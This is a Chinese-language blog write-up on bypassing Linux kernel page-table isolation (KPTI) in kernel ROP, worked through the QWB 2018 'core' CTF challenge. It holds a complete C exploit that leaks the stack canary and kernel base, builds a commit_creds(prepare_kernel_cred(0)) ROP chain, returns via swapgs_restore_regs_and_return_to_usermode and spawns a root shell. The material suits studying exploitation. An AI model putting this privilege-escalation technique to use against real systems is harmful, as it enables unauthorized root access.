---
title: Kernel初识 - Kernel ROP with KPTI bypass
date: '2025-08-10 01:26:50'
updated: '2025-08-10 01:28:37'
permalink: posts/16110.html
categories:
  - 知识分享
tags:
  - Kernel Pwn
---

# Kernel ROP with KPTI bypass

- <u>KPTI 相关概念直接引用 CTFwiki</u>

[KPTI](https://www.kernel.org/doc/html/latest/x86/pti.html) 即 `内核页表隔离`（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。

KPTI 的发明主要是用来修复一个史诗级别的 CPU 硬件漏洞：Meltdown。简单理解就是利用 CPU 流水线设计中（乱序执行与预测执行）的漏洞来获取到用户态无法访问的内核空间的数据，属于侧信道攻击的一种。

**KPTI 同时还令内核页表中属于用户地址空间的部分不再拥有执行权限，这使得 ret2usr 彻底成为过去式** 。

对于开启了 KPTI（内核页表隔离），我们**不能像之前那样直接 swapgs ; iret 返回用户态**，而是在返回用户态之前还**需要将用户进程的页表给切换回来** 。

众所周知 Linux 采用**四级页表**结构（PGD->PUD->PMD->PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页 4k，总计 8k，内核空间的在低地址，用户空间的在高地址），这样**只需要将 CR3 的第 13 位取反便能完成页表切换的操作**

![image-20250720182541886](/images/posts/20250810012811282.png)

需要进行说明的是，**在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，但两张页表都有着对用户内存空间的完整映射**，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局。

![image-20250720182551250](/images/posts/20250810012741491.png)

**KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式** 。

除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 `arch/x86/entry/entry_64.S` 中提供了一个用于完成内核态页表切换回到用户态页表的函数 `swapgs_restore_regs_and_return_to_usermode`，地址可以在 `/proc/kallsyms` 中获得。

由于源码的汇编代码编写较为繁重，我们可以通过 IDA 逆向的方式查看其基本汇编逻辑：

![image-20250720182558251](/images/posts/20250810012737530.png)

在实际操作时前面的一些栈操作都可以跳过，直接从 `mov rdi, rsp` 开始，这个函数大概可以总结为如下操作：

```
mov  rdi, cr3
or rdi, 0x1000
mov  cr3, rdi
pop rax
pop rdi
swapgs
iretq
```

因此我们只需要布置出如下栈布局即可：

```
↓   swapgs_restore_regs_and_return_to_usermode
    0 // padding
    0 // padding
    user_shell_addr
    user_cs
    user_rflags
    user_sp
    user_ss
```



## 开启KPTI保护

只需要在内核启动参数 `-append` 中添加 `pti=on` 选项以显式开启 KPTI 保护



## 例题 ：强网杯 2018 - core

![image-20250720183432112](/images/posts/20250810012739758.png)

由于题目刚开始是没有开启 KPTI 保护的 ，所以我们需要手动在启动参数 `-append` 中添加 `pti=on` 

然后我们启动程序 ，先观察一下 ，如果开启 KPTI 保护 ，执行我们之前的 exp 会发生什么 

![image-20250720183625537](/images/posts/20250810012741565.png)

可以看到运行之前的 exp 直接报错了 ，原因在于我们在内核态的页表中， 用户地址空间部分对应的页顶级表项没有可执行权限 

因此我们在返回用户态之前还需要先将内核态页表切换回来，这里我们在完成提权后直接使用 `swapgs_restore_regs_and_return_to_usermode` 函数返回用户态即可，而无需直接手动调用 `iretq` 指令。

而` swapgs_restore_regs_and_return_to_usermode `的地址我们依旧可以通过保存在 tmp/kallsyms 的函数地址来进行读取

![image-20250720184049653](/images/posts/20250810012743444.png)

`cat /proc/kallsyms | grep "swapgs_restore_regs_and_return_to_usermode"`

![image-20250720184434389](/images/posts/20250810012745930.png)

然后我们就得到了这个函数的地址 

![image-20250720185055421](/images/posts/20250810012749226.png)

计算偏移 ，这个偏移加上我们在调用exp得到的vmlinux地址就是我们最终的函数地址 

![image-20250720185256511](/images/posts/20250810012800865.png)

这个是 `swapgs_restore_regs_and_return_usermode` 函数的汇编代码，可以看到前面有很多 pop ，但是我们实际要从 `mov rdi,rsp` 开始 ，而这个地方的偏移恰好是在 `swapgs_restore_regs_and_return_usermode + 22` 

```
↓   swapgs_restore_regs_and_return_to_usermode
    0 // padding
    0 // padding
    user_shell_addr
    user_cs
    user_rflags
    user_sp
    user_ss
```

这个是我们要布置的栈布局 ，稍微改一下之前的代码就可以了

### EXP：

```
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<sys/ioctl.h>
#include<pthread.h>
void setoff(int fd,long long size){
    ioctl(fd,0x6677889c,size);
}
void core_read(int fd,char *buf){
    ioctl(fd,0x6677889b,buf);
}
void core_copy_func(int fd,long long size){
    ioctl(fd,0x6677889a,size);
}
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void)
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_shell(){
	system("/bin/sh");
}

int main(){
    int fd ;
    size_t tmp;
    char buf[0x50];
    size_t rop[0x100];
    size_t vmlinux_base,canary,core_base;
    size_t commit_creds = 0x9c8e0;
    size_t prepare_kernel_cred = 0x9cce0;
    save_status();
    fd = open("/proc/core",O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用
    if(fd < 0) {
        printf("Open /proc/core error!\n");
        exit(0);
    }
    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。
    core_read(fd,buf); //把canary读入用户态的buf 
    size_t pop_rdi = 0x000b2f;
    size_t push_rax = 0x02d112;
    size_t swapgs = 0x0d6;
    size_t iretq ;
    size_t xchg = 0x16684f0;
    size_t call_rax = 0x40398;
    size_t pop_rcx = 0x21e53;
    size_t pop_rbp = 0x3c4;
    size_t pop_rdx = 0xa0f49;
    size_t mov_rdi_rax_call_rdx = 0x01aa6a;
    //此时buf的前八个字节是我们的canary
    canary = (*(size_t *)(&buf[0]));
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] Canary  >> %p.\033[0m\n",canary);
    core_base = (*(size_t *)(&buf[2*8])) - 0x19b;
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] core_base  >> %p.\033[0m\n",core_base);
    vmlinux_base = (*(size_t *)(&buf[4*8]) - 0x1dd6d1);
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] vmlinux_base  >> %p.\033[0m\n",vmlinux_base);
    pop_rdi += vmlinux_base;
    pop_rcx += vmlinux_base;
    pop_rbp += vmlinux_base;
    pop_rdx += vmlinux_base;
    mov_rdi_rax_call_rdx += vmlinux_base;
    swapgs += core_base;
    iretq = 0x50ac2 + vmlinux_base;
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;
    size_t swapgs_restore_regs_and_return_to_usermode = 0xa008da + vmlinux_base;
    int i = 0;
    for(i=0;i<10;i++){
        rop[i] = canary;
    }
    i = 10;
    rop[i++] = pop_rdi; 
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx;
    rop[i++] = pop_rcx;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore_regs_and_return_to_usermode+22; 
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    write(fd,rop,i*8);
    core_copy_func(fd,0xf000000000000000+i*8);
    puts("\033[34m\033[1m[*] Attack Success! .\033[0m");
    return 0;
}
```

![image-20250720185702429](/images/posts/20250810012752743.png)

成功提权



## 参考链接：

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/















